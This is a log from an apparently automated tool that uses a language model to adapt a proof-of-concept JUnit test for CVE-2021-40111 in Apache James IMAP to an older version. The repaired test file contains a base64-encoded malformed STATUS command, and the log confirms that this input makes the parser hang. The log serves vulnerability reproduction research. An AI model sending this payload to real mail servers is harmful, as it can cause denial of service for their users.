[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: no arguments[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[RepairModule] Old grouped keys: {'method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession reason: actual and formal argument lists differ in length |'}
[RepairModule] New grouped keys: {'constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length |'}
[93m[RepairModule] [Analyzer] New error:
  File     : /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java
  Line     : 38, Column: 9
  Message  : constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length
  Symbol   : None
  Location : None
  Code     : super(new UnpooledStatusResponseFactory());
  Position : before the fixing line (40)[0m
[93m[RepairModule] [Analyzer] New error introduced before the fixing line, might be caused by the diff.[0m
[93m[RepairModule] [Analyzer] Stop to handle the error due to temperature 0.[0m
[96m[RepairModule] Found 10 diff combinations for annealing.[0m
[96m[RepairModule] Iteration 1, temperature 1.000: Trying diff #5554 with score 10.00[0m
[LLMClient] Tokens used: 891 (prompt), 505 (completion), 1396 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully in 3.5.0.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 3.5.0 to 3.4.0.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession reason: actual and formal argument lists differ in length, symble: None, location: None

### Error Position:
        super.decode(request, tag, session);

### Related Diff:
Operation: MODIFIED, File: protocols/imap/src/test/java/org/apache/james/imap/decode/main/IdRangeParseTest.java, Hunk: @@ -26,9 +26,9 @@

 import org.apache.james.imap.api.ImapConstants;
 import org.apache.james.imap.api.message.IdRange;
-import org.apache.james.imap.decode.DecodingException;
 import org.apache.james.imap.decode.ImapRequestLineReader;
 import org.apache.james.imap.decode.ImapRequestStreamLineReader;
+import org.apache.james.protocols.imap.DecodingException;
 import org.junit.Test;

 public class IdRangeParseTest  {

### Test File Content:
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.protocols.imap.utils.DecoderUtils;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild()
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), "AEA", new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild() {
        super();
    }

    public void decode(ImapRequestStreamLineReader request, String tag, FakeImapSession session) throws DecodingException {
        super.decode(request, tag, session);
    }
}



[LLMClient] Response: 
Here's the modified version of the test file according to the diff:

```java
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.imap.api.ImapCommand;
import org.apache.james.imap.api.process.ImapSession;
import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.protocols.imap.utils.DecoderUtils;
import org.apache.james.imap.decode.ImapRequestLineReader;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild()
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), "AEA", new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild() {
        super();
    }

    public void decode(ImapRequestStreamLineReader request, String tag, FakeImapSession session) throws DecodingException {
        super.decode(ImapCommand.anyStateCommand("Status"), request, tag, session);
    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'org.junit.runners.model.TestTimedOutException'[0m
[92m[Verifier] âœ“ Detail matched: 'milliseconds'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[RepairModule] Repair success![0m
[92m[RepairModule] Repair success with diff #5554 at iteration 1![0m